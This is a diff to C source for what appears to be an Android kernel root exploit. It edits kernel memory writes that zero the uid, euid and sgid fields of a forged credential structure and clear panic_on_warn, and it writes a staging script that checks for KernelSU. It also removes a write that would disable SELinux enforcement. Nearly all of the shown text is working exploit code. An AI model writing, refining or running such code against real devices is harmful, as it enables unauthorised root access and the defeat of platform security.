@@ -139,7 +139,6 @@ static int g_timer_go_r = -1, g_timer_go_w = -1;
 static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_write_val;
-static unsigned long long g_write_val;
 static unsigned long long g_slide;
 static int g_held;
 static int g_fake_stage;
@@ -894,7 +893,7 @@ static void write_ksu_script(void)
         "done\n"
         "if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; "
         "else echo KSU_MISSING; fi\n"
-        "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
+        "true\n"
         "echo \"[ksu] enforce=$(getenforce)\"\n";
     int fd = open("/data/local/tmp/ksu_stage.sh",
                   O_WRONLY | O_CREAT | O_TRUNC, 0755);
@@ -1954,27 +1953,20 @@ int main(int argc, char **argv)
         /* Removed no KASLR slide check to allow slide=0 */
         logf("[+] fake cred=%#llx selinux_state=%#llx\n", fc.A,
              SELINUX_STATE_STATIC + g_slide);
-        if (stage_write(SELINUX_STATE_STATIC + g_slide + 0x48, 0,
-                        "selinux", raw, NULL, 0))
-            park_forever("selinux write failed");
+        
         if (read_panic_on_warn() != 0 &&
             stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                         "panic_on_warn", raw, NULL, 0))
             park_forever("panic_on_warn write failed");
         if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL, 0))
             park_forever("fake uid fix failed");
+        if (stage_write(fc.A + 0x10, 0, "fake_sgid", raw, NULL, 0))
+            park_forever("fake sgid fix failed");
         if (stage_write(fc.A + CRED_EUID_OFF, 0, "fake_euid", raw, NULL, 0))
             park_forever("fake euid fix failed");
 
             
-        if (!g_slide) { /* Do nothing, slide is intentionally 0 */ }
-
-            
-        if (!g_slide) { /* Do nothing, slide is intentionally 0 */ }
-
-            
-        
-    }
+        }
     logf("[+] cred writes landed, waking child\n");
 
     if (write(go_fd, "A", 1) != 1)
